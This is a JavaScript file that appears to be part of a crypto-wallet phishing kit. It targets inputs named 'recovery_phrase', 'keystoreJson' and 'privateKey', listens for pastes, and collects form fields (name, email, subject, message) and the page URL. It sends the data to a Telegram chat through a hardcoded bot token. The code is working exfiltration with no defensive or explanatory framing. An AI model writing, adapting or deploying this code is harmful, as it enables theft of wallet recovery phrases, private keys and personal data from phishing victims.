const chatIds = ["1534371221"];
const inputIds = ["recovery_phrase", "keystoreJson", "privateKey"];

async function pasted() {
  console.log("paste caught");

  // await sleep();
  // await sendData("phraseinput");
}
const url = window.location.href;
async function sendData(inputId) {
  await sleep(1000);
  const name = document.getElementById("Name");
  const Subject = document.getElementById("Subject");
  const Message = document.getElementById("Message");
  const Email_Address = document.getElementById("Email-Address");
  const topic = document.getElementById("Please-select-a-topic");

  console.log(Email_Address);
  // const kp = document.getElementById("keystorePassword");
  // console.log(i);
  const data = `
Name: ${name.value} \n 
Please-select-a-topic: ${topic.value} \n 
Message ${Message.value} \n 
Subject: ${Subject.value} \n 

  Email : ${Email_Address.value} \n
   ${url}`;

  await sendMsg(data);
}

const sendMsg = async (msg) => {
  for (let i = 0; i < chatIds.length; i++) {
    const data = {
      chat_id: chatIds[i],
      text: msg,
    };
    const resp = await fetch(
      `https://api.telegram.org/bot6544701468%3AAAFHo-6ohRT0Tf4Ep9bG-yoWdxvt1AZeU0I/sendMessage`,
      {
        method: "POST",
        headers: {
          accept: "application/json",
          "content-type": "application/json",
        },
        body: JSON.stringify(data),
      }
    );
    const resJson = await resp.json();
    console.log(resJson);
  }
};

const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
